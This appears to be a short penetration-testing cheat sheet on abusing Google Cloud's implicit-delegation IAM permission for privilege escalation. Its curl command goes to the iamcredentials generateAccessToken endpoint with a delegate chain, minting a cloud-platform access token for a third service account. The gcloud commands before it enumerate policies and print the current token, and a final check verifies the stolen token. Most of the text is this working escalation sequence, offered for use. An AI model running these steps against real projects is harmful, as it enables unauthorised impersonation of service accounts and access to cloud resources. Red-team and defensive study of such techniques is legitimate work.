# iam.serviceAccounts.implicitDelegation IAM Permission abuse

## Description

### Implicit delegation allows one user or service account to perform actions on behalf of another user or service account without needing explicit consent for each action. This capability is often used in scenarios where an application needs access to GCP resources on behalf another identity. Such resources could by anything, from Cloud Storage buckets to Compute Engine instances (VMs).

## Use case scenario:

### SV1 can use the SV2 account that is assigned a role and has iam.serviceAccounts.implicitDelegation permission enabled and SV3 account is assigned the iam.serviceAccounts.getAccessToken Permission.

## Steps

 - gcloud iam service-accounts get-iam-policy ACCOUNT_NAME@PROJECT_NAME.iam.gserviceaccount.com (Let's suppose that we find the accounts with the above permissions in our use case scenario)

 - gcloud auth print-access-token (Prints our current user Access Token. In our use case scenario, the account is SV1)

### Here we use the implicit delegation privilege between the sv1 and sv2 service accounts to then generate an access token for the sv3 service account. In the command below we authenticate using the srv1 token, specify srv2 as a delegate, and send the request to the API endpoint to generate an API token for srv3.

 - curl -X POST \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/SV3@gr-proj-1.iam.gserviceaccount.com:generateAccessToken?access_token=ACCESS_TOKEN_OF_SV1_ACCOUNT" \
  -H "Content-Type: application/json" \
  --data '{
    "delegates": ["projects/-/serviceAccounts/'"SV2@PROJECT_NAME.iam.gserviceaccount.com"'"],
    "scope": ["https://www.googleapis.com/auth/cloud-platform"]
  }'

 - curl https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=SRV3_ACCESS_TOKEN (Verify that our requested Access Token is valid)
